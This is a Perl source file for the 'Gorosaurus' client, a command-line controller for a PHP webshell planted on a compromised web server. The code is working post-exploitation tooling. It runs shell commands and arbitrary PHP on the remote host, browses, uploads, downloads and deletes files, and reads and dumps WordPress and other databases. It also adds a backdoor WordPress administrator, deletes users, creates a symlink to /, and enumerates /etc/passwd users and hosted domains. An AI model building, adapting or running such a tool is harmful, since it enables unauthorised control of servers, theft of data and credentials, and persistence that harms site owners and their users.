# -={Gorosaurus v0.1: Perl client for Gorosaurus WebShell}=-

use Switch;
use LWP::UserAgent;
use MIME::Base64;
use Term::ANSIColor;

#$head_pass = "XXX";
#$master_pass = "cartilaginoso";
#$head_exe = "YYY";
$sql_head = "ZZZ"; #Edit
$init_sql = "NO";

sub send_it {
	$url = $_[0];
	$pass_head = $_[1];
	$pass_pass = $_[2];
	$exec_head = $_[3];
	$exec_exec = $_[4];

	$ua = LWP::UserAgent->new();
	@headers = (
		'User-Agent' => "Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.3.0",
		$pass_head => $pass_pass,
		$exec_head => $exec_exec,
		$sql_head => $init_sql
	);
	$req = $ua->get($url, @headers);
	$html = $req->decoded_content;
	return $html;
}

sub upload_it {
	$url = $_[0];
	$pass_head = $_[1];
	$pass_pass = $_[2];
	$exec_head = $_[3];
	$exec_exec = $_[4];
	$source = $_[5];

	$ua = LWP::UserAgent->new();
	@headers = (
		'User-Agent' => "Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.3.0",
		$pass_head => $pass_pass,
		$exec_head => $exec_exec
	);
	$req = $ua->post($url, ["upload" => $source], @headers);
	$html = $req->decoded_content;
	print $html;
}

sub ping {
	$ping = encode_base64("ping");
	$do = send_it($url, $head_pass, $master_pass, $head_exe, $ping); 
	if ($do !~ /alive/) {
		print "\n\n[!] Login failed or the webshell was removed!";
		exit;
	} else {
		return 1;
	}
}

sub db_credentials {
	$list_db_cred = encode_base64("db_cred");
	$do = send_it($url, $head_pass, $master_pass, $head_exe, $list_db_cred);
	print "\n$do\n\n\n"; 
}

sub cls { #From Stack Overflow
	print "\033[2J";    #clear the screen
	print "\033[0;0H"; #jump to 0,0
}

sub db_wpdump {
	print colored("\n[?] ", red) . colored("Path/name to save the database backup: ", cyan);
	$path = <STDIN>;
	chomp($path);
	$dump = encode_base64("db_wpdump");
	$do = send_it($url, $head_pass, $master_pass, $head_exe, $dump);	
	open(FILE, ">>$path");
	print FILE $do;
}

sub db_dump {
	print colored("\n[?] ", red) . colored("Path/name to save the database backup: ", cyan);
	$path = <STDIN>;
	chomp($path);
	print colored("\n[?] ", red) . colored("Database name: ", cyan);
	$dbname = <STDIN>;
	chomp($dbname);
	$dump = encode_base64("db_dump"). "**" .encode_base64($dbname);
	$do = send_it($url, $head_pass, $master_pass, $head_exe, $dump);	
	open(FILE, ">>$path");
	print FILE $do;
}

sub list_databases {
	print colored("\n[!] ", red) . colored("Database names displayed here are wich current user can list.\n",cyan);
	print colored("[!] ", red) . colored("Maybe are not all databases.\n", cyan); 
	$list_db = encode_base64("db_list_databases");
	$do = send_it($url, $head_pass, $master_pass, $head_exe, $list_db);
	print "$do\n\n";
}

sub list_tables {
	print colored("\n[?] ", red) . colored("Insert database name: ", cyan);
	$db = <STDIN>;
	chomp($db);
	$list_ta = encode_base64("db_list_tables") . "**" . encode_base64($db);
	$do = send_it($url, $head_pass, $master_pass, $head_exe, $list_ta);
	print colored("\n[!] ", red) . colored("Table names from ", cyan) . colored("$db\n", yellow);
	print "$do\n\n";
}
sub list_columns {
	print colored("\n[?] ", red) . colored("Insert database name: ", cyan);
	$db = <STDIN>;
	chomp($db);
	print colored("\n[?] ", red) . colored("Insert table name: ", cyan);
	$ta = <STDIN>;
	chomp($ta);
	$list_co = encode_base64("db_list_columns") . "**" . encode_base64($db). "**". encode_base64($ta);
	$do = send_it($url, $head_pass, $master_pass, $head_exe, $list_co);
	print colored("\n[!] ", red) . colored("Columns in table ", cyan) . colored("$ta", yellow) . colored(" from ", cyan) . colored($db."\n", yellow);
	print "$do\n\n";
}

sub load_file {
	print colored("[?] ", red) . colored("Insert path/file to show his source: ", cyan);
	$path = <STDIN>;
	chomp($path);
	$path = encode_base64("db_loadfile") . "**" . encode_base64($path);
	$do = send_it($url, $head_pass, $master_pass, $head_exe, $path);
	print "\n$do\n\n";
}

sub allowed {
	print colored("\n[?] ", red) . colored("Insert functions separated by commas ( , ): ", cyan);
	$func = <STDIN>;
	chomp($func);
	$func = encode_base64("allowed")."**". encode_base64($func);
	$do = send_it($url, $head_pass, $master_pass, $head_exe, $func);
	print $do."\n\n";
}

sub server_info {
	$info = encode_base64("server_info");
	$do = send_it($url, $head_pass, $master_pass, $head_exe, $info);
	print "\n$do\n\n\n"; 
}

sub eval_code {
	while (1) {
		msg(2);
		$eval = <STDIN>;
		chomp($eval);
		if ($eval eq "exit") { last; }
		$eval = encode_base64("eval_code") . "**" . encode_base64($eval);
		$do = send_it($url, $head_pass, $master_pass, $head_exe, $eval);
		print "\n$do\n\n\n"; 
	}
}

sub terminal {
	print colored("\n[?] ", red) . colored("Insert function to use (system, passthru...): ", cyan);
	$sys_opt = <STDIN>;
	chomp($sys_opt);
	while(1) {
		msg(3);
		$sys = <STDIN>;
		chomp($sys);
		if ($sys eq "exit") { last; }
		$sys = encode_base64("terminal") . "**" . encode_base64($sys_opt) . "**" . encode_base64($sys);
		$do = send_it($url, $head_pass, $master_pass, $head_exe, $sys);
		print "\n$do\n\n";
	} 
}

sub browser {
	while(1) {
		msg(4);
		$opt = <STDIN>;
		chomp($opt);
		@opt = split(" ", $opt);
		if ($opt[0] eq "exit") { last; }
		switch($opt[0]) {
			case "pwd" { get_dir(); }
			case "cd" { cd_dir($opt[1]); }
			case "ls" { ls_dir(); }
			case "cat" { cat_file($opt[1]); }
			case "download" { down_file($opt[1],$opt[2]); }
			case "upload" { upload($opt[1],$opt[2]); }
			case "help" { help_browser(); }
			case "delete" { del_file($opt[1]);}
			else { print colored("\n[-] ", red) . colored("Command not found. Try <", cyan) . colored("help", yellow) . colored("> to list all commands\n\n",cyan); }
		}
	}
}


sub upload {
	$name = $_[0];
	$source = $_[1];
	open(FILE, "<", $source);
	$source = "";
	while ($linea = <FILE>) {
		$source .= $linea;
	}
	$source = encode_base64($source);
	$send = encode_base64("browse"). "**" . encode_base64("upload**".$name);
	upload_it($url, $head_pass, $master_pass, $head_exe, $send, $source);
}
sub get_dir {
	if (!$this_dir) {
		$send = encode_base64("browse") . "**" . encode_base64("pwd");
		$do = send_it($url, $head_pass, $master_pass, $head_exe, $send);
		if ($do =~ m/\:\:(.*?)\:\:/g) {
			$this_dir = $1;
		}
	}
	print colored("\n[!]", red). colored( " Current dir is ", cyan) . colored($this_dir, yellow) . "\n\n";
}


sub cd_dir {
	$dir = $_[0];
	if ($dir =~ /^\//) {
		$this_dir = $dir;
	} elsif ($dir =~ /^\.\./) {
		$last = rindex($this_dir, "/");
		$this_dir = substr($this_dir, 0, $last);
	} else {
		$this_dir = $this_dir ."/". $dir;
	}
}

sub ls_dir {
	$opt = encode_base64("browse") . "**" . encode_base64("ls**".$this_dir);
	$do = send_it($url, $head_pass, $master_pass, $head_exe, $opt);
	print "\n$do\n\n";

}

sub cat_file {
	$opt = $_[0];
	$opt = encode_base64("browse") . "**" . encode_base64("cat**".$this_dir."/".$opt);
	$do = send_it($url, $head_pass, $master_pass, $head_exe, $opt);
	print $do;
}

sub wp_status {
	$wpst = encode_base64("wp_status");
	$do = send_it($url, $head_pass, $master_pass, $head_exe, $wpst);
	print "$do\n\n";
}

sub add_admin {
	print colored("[?] ", red) . colored("Insert username: ", cyan);
	$admin_user = <STDIN>;
	chomp($admin_user);
	print colored("[?] ", red) . colored("Insert password: ", cyan);
	$admin_pass = <STDIN>;
	chomp($admin_pass);
	$do = send_it($url, $head_pass, $master_pass, $head_exe, encode_base64("wp_addadmin")."**". encode_base64($admin_user)."**".encode_base64($admin_pass));
	print "\n";
}

sub del_user {
	print colored("[?] ", red) . colored("Insert login name: ", cyan);
	$user = <STDIN>;
	chomp($user);
	$do = send_it($url, $head_pass, $master_pass, $head_exe, encode_base64("wp_delete_user")."**". encode_base64($user));
}
sub down_file{
	$local_file = $_[1];
	$remote_file = $_[0];
	open(FILE, ">",$local_file);
	$opt = encode_base64("browse") . "**" . encode_base64("cat**".$this_dir."/".$remote_file);
	$do = send_it($url, $head_pass, $master_pass, $head_exe, $opt);
	print FILE $do;
	close(FILE);
}

sub del_file{
	$file = $_[0];
	$del = encode_base64("browse") . "**" . encode_base64("delete**".$this_dir."/".$file);
	$do = send_it($url, $head_pass, $master_pass, $head_exe, $del);
}

sub db_def() {
	print colored("\n[?] ", red) . colored("Username: ", cyan);
	$user = <STDIN>;
	chomp($user);
	print colored("[?] ", red). colored("Password: ", cyan);
	$pass = <STDIN>;
	chomp($pass);
	print colored("[?] ", red). colored("Database name: ", cyan);
	$dbname = <STDIN>;
	chomp($dbname);
	print colored("[?] ", red). colored("Host: ", cyan);
	$host = <STDIN>;
	chomp($host);
	$init_sql = encode_base64($user."**".$pass."**".$dbname."**".$host);
	print "\n";
}

sub sym_link() {
	print colored("\n[+]", red) . colored(" Trying to create the symlink...\n", cyan); 
	$sym = encode_base64("symlink");
	$do = send_it($url, $head_pass, $master_pass, $head_exe, $sym);
	if ($do =~ /YES/) { print colored("[!] ", red) . colored("Symlink created succesfully!\n", cyan); }
	else { print colored("[-] ", red) . colored("Symlink couldn't be created!\n", yellow); }
	print "\n\n"
}

sub server_users() {
	$svu = encode_base64("server_users");
	$do = send_it($url, $head_pass, $master_pass, $head_exe, $svu);
	if ($do =~ /ERROR-DA_FCK/) { print colored("\n[!] ", red) . colored("Can't access to /etc/passwd\n\n", yellow); }
	else { print colored("\n[+] ", red) . colored("User list: $do\n", cyan);}
	print "\n";
}

sub domain_list() {
	$dl = encode_base64("domain_list");
	$do = send_it($url, $head_pass, $master_pass, $head_exe, $dl);
	if ($do =~ /ER#OR/) { print colored("\n[!] ", red) . colored("Can't access to /etc/named.conf\n\n", yellow); }
	else { print colored("\n[+] ", red) . colored("Domain list: $do\n", cyan);}
	print "\n";
}

banner();
login();

while (1) {
	msg(1);
	$command = <STDIN>;
	chomp($command);
	switch($command) {
		case "exit" { exit(); }
		case "db_credentials" { db_credentials(); }
		case "clear" { cls(); }
		case "db_wpdump" { db_wpdump(); }
		case "allowed" { allowed(); }
		case "server_info" { server_info(); }
		case "eval" { eval_code(); }
		case "terminal" { terminal(); }
		case "browser" { browser(); }
		case "db_list" { list_databases();}
		case "db_tables" { list_tables();}
		case "db_columns" { list_columns(); }
		case "db_dump" { db_dump(); }
		#case "db_loadfile" { load_file(); }
		case "db_def_credentials" { db_def(); }
		case "wp_status" { wp_status(); }
		case "wp_add_admin" { add_admin(); }
		case "help" { help_general(); }
		case "wp_delete_user" { del_user(); }
		case "symlink" { sym_link(); }
		case "server_users" { server_users();}
		case "domain_list" { domain_list(); }
		else { print colored("\n[-] ", red) . colored("Command not found. Try <", cyan) . colored("help", yellow) . colored("> to list all commands\n\n",cyan); }
	}
}


sub banner {	
	print colored("\n\n            <-------------====={", red) . colored("Gorosaurus Client", cyan) .  colored("}=====------------->\n", red);
	print colored ("                                   By \@TheXC3LL\n\n", yellow);
}

sub login {
	print colored("[?] ", red) . colored("Insert url: ", cyan);
	$url = <STDIN>;
	chomp($url);
	print colored("[?] ", red) . colored("Insert header for password field: ", cyan);
	$head_pass = <STDIN>;
	chomp($head_pass);
	print colored("[?] ", red) . colored("Insert password: ", cyan);
	$master_pass = <STDIN>;
	chomp($pass_pass);
	print colored("[?] ", red) . colored("Insert header for command field: ", cyan);
	$head_exe = <STDIN>;
	chomp($head_exe);
	if (ping() eq "1") {
		print colored("\n\n[!] ", red) . colored("Login successful!\n\n", cyan);
	}

}

sub msg {
	$prompt_op = $_[0];
	switch($prompt_op) {
		if ($url =~ m/\:\/\/(.*?)\//) { $loc_prompt = $1; }
		case "1" { print colored("[", red) . colored($loc_prompt, blue). colored("@", yellow) . colored("Gorosaurus Client", cyan) . colored("]", red) . colored("\$ ", red);  }
		case "2" { print colored("[", red) . colored($loc_prompt, blue). colored("@", yellow) . colored("Gorosaurus Client", cyan) . colored("]", red) . colored("/[", red) .colored("Eval", cyan) . colored("]", red) .colored("\$ ", red);  }
		case "3" { print colored("[", red) . colored($loc_prompt, blue). colored("@", yellow) . colored("Gorosaurus Client", cyan) . colored("]", red) . colored("/[", red) .colored("Console", cyan) . colored("]", red) .colored("\$ ", red);  }
		case "4" { print colored("[", red) . colored($loc_prompt, blue). colored("@", yellow) . colored("Gorosaurus Client", cyan) . colored("]", red) . colored("/[", red) .colored("Browser", cyan) . colored("]", red) .colored("\$ ", red);  }
	}
}

sub help_general() {
	print q(

	exit	        	-- Close gorosaurus client
	clear	        	-- Clear the terminal
	db_credentials  	-- If CMS is WordPress, show database credentials
	db_wpdump       	-- If CMS is WordPress, dump the WordPress database
	allowed	        	-- Shows allowed PHP functions
	server_info     	-- Shows server info
	terminal       		-- Starts a terminal sesion in compromised server
	eval	        	-- Evaluate PHP code in remote server
	browser			-- Starts "browser mode". For more info, do "help" after enter in that mode
	db_list			-- Shows all databases that current user can list
	db_tables		-- Shows all tables contained in a database
	db_columns		-- Shows all columns contained in a table
	db_dump			-- Dumps a database
	db_def_credentials 	-- If compromised server is not a WordPress, you need to set DB credentials
	wp_status		-- Shows info related to the WordPress
	wp_add_admin		-- Adds an administrator user
	wp_delete_user		-- Delete an user from the DB
	symlink			-- Create symlink to "/" 
	server_users		-- Enumerate users in the server
	domain_list		-- Enumerate domains hosted in the same server


);
}
sub help_browser() {
	print q(

	pwd 		-- Shows current remote path (Do "pwd" at start browser mode)
	cd		-- Change current remote path
	cat		-- Shows source of a file
	ls		-- List al files/directories in current path
	download	-- Download a file
	upload		-- Upload a file
	delete		-- Delete a file

);
}







